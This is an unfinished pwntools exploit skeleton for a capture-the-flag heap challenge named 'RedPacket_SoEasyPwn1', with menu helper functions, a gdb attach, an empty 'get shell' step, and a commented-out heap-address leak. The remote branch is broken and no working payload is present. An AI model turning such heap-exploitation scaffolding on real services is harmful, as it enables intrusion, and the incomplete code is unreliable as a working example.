#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

if(sys.argv[1] == 'l'):
	p = process('./RedPacket_SoEasyPwn1')
	elf = ELF('./RedPacket_SoEasyPwn1')

else:
	p = remote
	elf = ELF('./RedPacket_SoEasyPwn1')

sd = lambda x:p.send(x)
sl = lambda x:p.sendline(x)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda x,y:p.sendlineafter(x,y)
rv = lambda x:p.recv(x)
ru = lambda x:p.recvuntil(x)
ia = lambda :p.interactive()
context.log_level = 'debug'

def menu(cmd):
	sla("Your input: ",str(cmd))

def get(idx,size,content):
	menu(1)
	sla("Please input the red packet idx:",str(idx))
	sla("(1.0x10 2.0xf0 3.0x300 4.0x400):",str(size))
	sla("input content:",content)

def throw(idx):
	menu(2)
	sla("red packet idx: ",str(idx))

def change(idx,content):
	menu(3)
	sla("Please input the red packet idx:",str(idx))
	sla("input content:",content)

def watch(idx):
	menu(4)
	sla("Please input the red packet idx:",str(idx))


gdb.attach(p)
###get shell###
ia()



'''
###leak heap###
get(0,3,'aaaa')
get(1,3,'bbbb')

throw(0)
throw(1)

watch(1)
heap = u64(ru('\x55')[-6:].ljust(8,'\x00')) - 0x270
success(hex(heap))
'''
